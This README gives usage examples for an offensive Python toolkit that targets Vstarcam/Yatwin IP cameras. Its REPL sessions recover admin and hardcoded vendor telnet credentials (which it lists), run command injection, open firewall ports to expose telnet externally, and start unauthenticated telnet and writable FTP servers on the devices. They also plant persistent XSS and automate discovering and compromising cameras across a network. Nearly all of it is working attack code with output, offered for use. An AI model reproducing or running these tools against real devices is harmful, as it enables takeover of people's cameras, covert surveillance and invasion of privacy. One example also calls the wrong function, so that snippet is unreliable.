# python-yatwin: /yatwin/scripts/

## Contents:
* [bypass_firewall_telnet](#example-bypass_firewall_telnet)
* [command_inject](#example-command_inject)
* ~~[detect_telnet_auth](#example-detect_telnet_auth)~~
* [find_cameras](#example-find_cameras)
* [find_devices](#example-find_devices)
* [hack_cameras](#example-hack_cameras)
* [hack_camera](#example-hack_camera)
* [hack_http_auth](#example-hack_http_auth)
* [hack_interfaces](#example-hack_interfaces)
* [hack_telnet_auth](#example-hack_telnet_auth)
* [get_http_port](#example-get_http_port)
* [get_rtsp_port](#example-get_rtsp_port)
* ~~[protect_http_auth](#example-protect_http_auth)~~
* [start_ftp_server](#example-start_ftp_server)
* [start_telnet_server](#example-start_telnet_server)
* [xss_inject](#example-xss_inject)

### Example: bypass_firewall_telnet
```python
>>> from yatwin.scripts import bypass_firewall_telnet
>>> from yatwin.interfaces import Http, Telnet
>>> from pprint import pprint
>>>
>>> # Camera HTTP Information
>>> HOST = '192.168.1.236'
>>> USERNAME = 'admin'
>>> PASSWORD = '888888'
>>> PORT = 80
>>> 
>>> # Create a Http instance
>>> http = Http(HOST, username = USERNAME, password = PASSWORD, port = PORT)
>>> http
<Http(admin:888888@192.168.1.236:80)>
>>> 
>>> # Bypass firewall
>>> resp = bypass_firewall_telnet(http)
>>> pprint(resp)
{'_success': True,
 'external_host': '85.173.84.29',
 'external_telnet_port': 1025,
 'internal_host': '192.168.1.236',
 'internal_telnet_port': 1025}
 >>>
 >>> # Camera Telnet Information
 >>> TELNET_USERNAME = 'vstarcam2015'
 >>> TELNET_PASSWORD = '20150602'
 >>>
 >>> # Create (external!) Telnet instance
 >>> telnet = Telnet \
 (
 	resp['external_host'], 
	username = TELNET_USERNAME, 
	password = TELNET_PASSWORD, 
	port = resp['external_port']
)
>>> telnet
<Telnet(vstarcam2015:20150602@85.173.84.29:1025)>
>>>
>>> # Prove it works
>>> print(telnet.ls())
bin            init           mknod_console  root           tmp
boot           lib            mnt            sbin           usr
dev            linuxrc        nfsroot        share          var
etc            lost+found     opt            sys
home           mkimg.rootfs   proc           system
>>>
```

### Example: command_inject
```python
>>> from yatwin.scripts import command_inject
>>> from yatwin.interfaces import Http
>>> 
>>> # Camera HTTP Information
>>> HOST = '192.168.1.223'
>>> USERNAME = 'admin'
>>> PASSWORD = '888888'
>>> PORT = 80
>>> 
>>> # Create a Http instance
>>> http = Http(HOST, username = USERNAME, password = PASSWORD, port = PORT)
>>> http
<Http(admin:888888@192.168.1.223:80)>
>>> 
>>> # Command inject 'whoami'
>>> # ... blind => True: Don't return commands stdout, False: Do
>>> # ... clear => True: Do clear command injection from camera, False: Don't
>>> # Note: Blind command injection is *alot* faster
>>> whoami = command_inject(http, 'whoami', blind = False, clear = True)				
>>> whoami		
'vstarcam2017\n'
>>> 
```

### Example: find_cameras
```python
>>> from yatwin.scripts import find_cameras
>>> from pprint import pprint
>>>
>>> # Find cameras using *wsdd discover* packets
>>> # ... attempts => How many times to try and discover max_interest cameras
>>> # ... max_interest => How many cameras you are hoping to discover
>>> cams = find_cameras(attempts=10, max_interest=1)
>>>
>>> # View discovered cameras
>>> pprint(cams)
[{'Endpoint': 'onvif/device_service', 'Host': '192.168.1.222', 'Port': 10080},
 {'Endpoint': 'onvif/device_service', 'Host': '192.168.1.237', 'Port': 10080},
 {'Endpoint': 'onvif/device_service', 'Host': '192.168.1.231', 'Port': 10080}]
>>>
```

### Example: find_devices
```python
>>> from yatwin.scripts import find_devices
>>> from pprint import pprint
>>> 
>>> # Find devices
>>> devices = find_devices()
>>>
>>> # View discovered devices
>>> pprint(devices)
[{'Address': 'http://192.168.1.223:10080/onvif/device_service',
  'DeviceCategory': 'Devices',
  'SsdpIp': '239.255.255.250',
  'Type': 'n:NetworkVideoTransmitter'},
 {'Address': 'http://192.168.1.237:10080/onvif/device_service',
  'DeviceCategory': 'Devices',
  'SsdpIp': '239.255.255.250',
  'Type': 'n:NetworkVideoTransmitter'}]
>>> 
```

### Example: hack_cameras
```python
>>> from yatwin.scripts import hack_cameras
>>> from pprint import pprint
>>>
>>> # Hack cameras
>>> # ... aim => How many cameras you aim to discover and hack
>>> cams = hack_cameras(aim = 1)
>>>
>>> # View hacked cameras
>>> # In this instance we got lucky and managed to find, and hack, 3 cameras
>>> pprint(cams)
[<BaseHackedYatwin
(
	http:      <Http(admin:888888@192.168.1.236:80)>
	icmp:      <Icmp(192.168.1.236)>
	onvif:     <Onvif(admin:888888@192.168.1.236:10080)>
	telnet:    <Telnet(vstarcam2015:20150602@192.168.1.236:23)>
	ftp:       None
	multicast: <Multicast()>
	imap:      None
	rtsp:      <Rtsp(admin:888888@192.168.1.236:10554)[udp/av1_0]>
)>,
 <BaseHackedYatwin
(
	http:      <Http(admin:888888@192.168.1.227:80)>
	icmp:      <Icmp(192.168.1.227)>
	onvif:     <Onvif(admin:888888@192.168.1.227:10080)>
	telnet:    <Telnet(vstarcam2017:20170912@192.168.1.227:23)>
	ftp:       None
	multicast: <Multicast()>
	imap:      None
	rtsp:      <Rtsp(admin:888888@192.168.1.227:10554)[udp/av1_0]>
)>,
 <BaseHackedYatwin
(
	http:      <Http(admin:Password1@192.168.1.235:80)>
	icmp:      <Icmp(192.168.1.235)>
	onvif:     <Onvif(admin:888888@192.168.1.235:10080)>
	telnet:    None
	ftp:       None
	multicast: <Multicast()>
	imap:      None
	rtsp:      <Rtsp(admin:Password1@192.168.1.235:10554)[udp/av1_0]>
)>]
```

### Example: hack_camera
```python
>>> from yatwin.scripts import hack_camera
>>>
>>> # Camera details
>>> HOST = '192.168.1.227'
>>> ONVIF_PORT = 10080 # Default Onvif port
>>>
>>> # Attempt to hack camera
>>> cam = hack_camera(HOST, onvif_port = ONVIF_PORT)
>>> cam
<BaseHackedYatwin
(
	http:      <Http(admin:888888@192.168.1.227:80)>
	icmp:      <Icmp(192.168.1.227)>
	onvif:     <Onvif(admin:888888@192.168.1.227:10080)>
	telnet:    <Telnet(vstarcam2017:20170912@192.168.1.227:23)>
	ftp:       None
	multicast: <Multicast()>
	imap:      None
	rtsp:      <Rtsp(admin:888888@192.168.1.227:10554)[udp/av1_0]>
)>
>>> 
```

### Example: hack_http_auth
```python
>>> from yatwin.scripts import hack_http_auth
>>> 
>>> # Camera information
>>> HOST = '192.168.1.227'
>>> PORT = 80
>>> 
>>> # Hack HTTP auth
>>> auth = hack_http_auth(HOST, port = PORT)
>>> auth
{'username': 'admin', 'password': '888888'}
```

### Example: hack_interfaces
```python
>>> from yatwin.scripts import hack_interfaces
>>> from pprint import pprint
>>> 
>>> # Camera information
>>> HOST = '192.168.1.227'
>>> ONVIF_PORT = 10080
>>> 
>>> # Hack cameras interfaces
>>> interfaces = hack_interfaces(HOST, onvif_port = ONVIF_PORT)
>>>
>>> # View hacked interfaces
>>> pprint(interfaces)
{'Ftp': None,
 'Http': <Http(admin:888888@192.168.1.227:80)>,
 'Icmp': <Icmp(192.168.1.227)>,
 'Imap': None,
 'Multicast': <Multicast()>,
 'Onvif': <Onvif(admin:888888@192.168.1.227:10080)>,
 'Rtsp': <Rtsp(admin:888888@192.168.1.227:10554)[udp/av1_0]>,
 'Telnet': <Telnet(vstarcam2017:20170912@192.168.1.227:23)>}
>>> 
```

### Example: hack_telnet_auth
```python
>>> from yatwin.scripts import hack_telnet_auth
>>> from yatwin.interfaces import Http
>>> 
>>> HOST = '192.168.1.227'
>>> USERNAME = 'admin'
>>> PASSWORD = '888888'
>>> PORT = 80
>>> 
>>> http = Http(HOST, username = USERNAME, password = PASSWORD, port = PORT)
>>> http
<Http(admin:888888@192.168.1.227:80)>
>>> 
>>> auth = hack_telnet_auth(http)
>>> auth
{'username': 'vstarcam2017', 'password': '20170912'}
>>> 
```

### Example: get_http_port
```python
>>> from yatwin.interfaces import Onvif
>>> from yatwin.scripts import get_http_port
>>> 
>>> # Camera Onvif information
>>> HOST = '192.168.1.227'
>>> PORT = 10080
>>> 
>>> # Create an Onvif instance
>>> onvif = Onvif(HOST, port = PORT)
>>> onvif
<Onvif(admin:888888@192.168.1.227:10080)>
>>> 
>>> # Retrieve that cameras HTTP port, using Onvif
>>> http_port = get_http_port(onvif)
>>> http_port
80
>>> 
```

### Example: get_rtsp_port
```python
>>> from yatwin.interfaces import Onvif
>>> from yatwin.scripts import get_rtsp_port
>>> 
>>> # Camera Onvif information
>>> HOST = '192.168.1.227'
>>> PORT = 10080
>>> 
>>> # Create an Onvif instance
>>> onvif = Onvif(HOST, port = PORT)
>>> onvif
<Onvif(admin:888888@192.168.1.227:10080)>
>>> 
>>> # Retrieve that cameras RTSP port, using Onvif
>>> rtsp_port = get_http_port(onvif)
>>> rtsp_port
10554
>>> 
```

### Example: start_ftp_server
```python
>>> from yatwin.scripts import start_ftp_server
>>> from yatwin.interfaces import Telnet, Ftp
>>> from yatwin.utils import scan_port
>>> 
>>> # Camera Telnet information
>>> HOST = '192.168.1.227'
>>> USERNAME = 'vstarcam2017'
>>> PASSWORD = '20170912'
>>> 
>>> # Create a Telnet instance
>>> telnet = Telnet(HOST, username = USERNAME, password = PASSWORD)
>>> telnet
<Telnet(vstarcam2017:20170912@192.168.1.227:23)>
>>> 
>>> # Check to see if an FTP server is up and running (FTP uses port 21)
>>> scan_port(HOST, 21)
False
>>> 
>>> # Start an FTP server on the camera using Telnet
>>> # ... allow_uploads => Whether to allow clients to upload files to the FTP server
>>> start_ftp_server(telnet = telnet, allow_uploads = True)
True
>>> 
>>> # Check to see if an FTP server is up and running (FTP uses port 21)
>>> scan_port(HOST, 21)
True
>>> 
>>> # Create an FTP client instance
>>> ftp = Ftp(HOST)
>>> ftp
<Ftp(:@192.168.1.227:21)>
>>>
>>> # Check a basic FTP command, such as LIST
>>> print(ftp.ls())
drwxrwxr-x    2 1003     1003          1573 Apr 18  2017 bin
drwxrwxr-x    2 1003     1003             3 Mar 13  2017 boot
drwxrwxrwt    5 vstarcam root          3400 Sep 13 23:16 dev
drwxrwxr-x    5 1003     1003           238 Apr 18  2017 etc
drwxrwxr-x    2 1003     1003             3 Mar 13  2017 home
lrwxrwxrwx    1 1003     1003             9 Mar 13  2017 init -> sbin/init
drwxrwxr-x    3 1003     1003          1432 Apr 18  2017 lib
lrwxrwxrwx    1 1003     1003            11 Mar 13  2017 linuxrc -> bin/busybox
drwxrwxr-x    2 1003     1003             3 Mar 13  2017 lost+found
-rwxrwxr-x    1 1003     1003          1341 Mar 13  2017 mkimg.rootfs
-rwxrwxr-x    1 1003     1003           431 Mar 13  2017 mknod_console
drwxrwxr-x    6 1003     1003            63 Mar 13  2017 mnt
drwxrwxr-x    2 1003     1003             3 Mar 13  2017 nfsroot
drwxrwxr-x    2 1003     1003             3 Mar 13  2017 opt
dr-xr-xr-x   68 vstarcam root             0 Jan  1  1970 proc
drwxrwxr-x    2 1003     1003            31 Apr 18  2017 root
drwxrwxr-x    2 1003     1003           893 Apr 18  2017 sbin
drwxrwxr-x    2 1003     1003             3 Mar 13  2017 share
dr-xr-xr-x   12 vstarcam root             0 Jan  1  1970 sys
drwxr-xr-x    7 vstarcam root             0 Jan  1  1970 system
drwxrwxrwt    2 vstarcam root           500 Sep 14 00:57 tmp
drwxrwxr-x    6 1003     1003            62 Mar 13  2017 usr
drwxrwxr-x    4 1003     1003            37 Mar 13  2017 var
>>>
```

### Example: start_telnet_server
```python
>>> from yatwin import scripts
>>> from yatwin import interfaces
>>> from yatwin import utils
>>> 
>>> # Camera (HTTP) information
>>> HOST = '192.168.1.227'
>>> HTTP_USERNAME = 'admin'
>>> HTTP_PASSWORD = '888888'
>>> HTTP_PORT = 80
>>> 
>>> # Create a Http instance
>>> http = interfaces.Http \
(
	HOST,
	username = HTTP_USERNAME,
	password = HTTP_PASSWORD,
	port = HTTP_PORT,
)
>>> http
<Http(admin:888888@192.168.1.227:80)>
>>> 
>>> # Check to see if telnet is already running on port 23
>>> utils.scan_port(HOST, 23)
False
>>> 
>>> # Start a telnet server
>>> scripts.start_telnet_server(http = http, port = 23, auth = False, kill_all = True)
True
>>> 
>>> # Check to see if telnet is now running on port 23
>>> utils.scan_port(HOST, 23)
True
>>> 
>>> # Camera (Telnet) information
>>> TELNET_USERNAME = '' # auth == False when starting server
>>> TELNET_PASSWORD = '' # auth == False when starting server
>>> TELNET_PORT = 23
>>> 
>>> # Create a Telnet instance
>>> telnet = interfaces.Telnet \
(
	HOST,
	username = TELNET_USERNAME,
	password = TELNET_PASSWORD,
	port = TELNET_PORT,
)
>>> telnet
<Telnet(:@192.168.1.227:23)>
>>> 
>>> # Prove it works
>>> print(telnet.ls())
sda0  sda1  sda2  sda3
>>> 
```

### Example: xss_inject
```python
>>> from yatwin.scripts import xss_inject
>>> from yatwin.interfaces import Http
>>> from webbrowser import open_new
>>> 
>>> # Camera HTTP information
>>> HOST = '192.168.1.227'
>>> USERNAME = 'admin'
>>> PASSWORD = '888888'
>>> PORT = 80
>>> 
>>> # Create a Http instance
>>> http = Http(HOST, username = USERNAME, password = PASSWORD, port = PORT)
>>> http
<Http(admin:888888@192.168.1.227:80)>
>>> 
>>> # Perform persistent xss (Cross-Site-Scripting)
>>> payload = 'alert("XSS!")'
>>> xss_inject(http, payload)
True
>>> 
>>> # Test that it worked
>>> url = http._make_url('index.htm')
>>> url
'http://admin:888888@192.168.1.227:80/index.htm?loginuse=admin&loginpas=888888'
>>> open_new(url)
True
>>> 
```
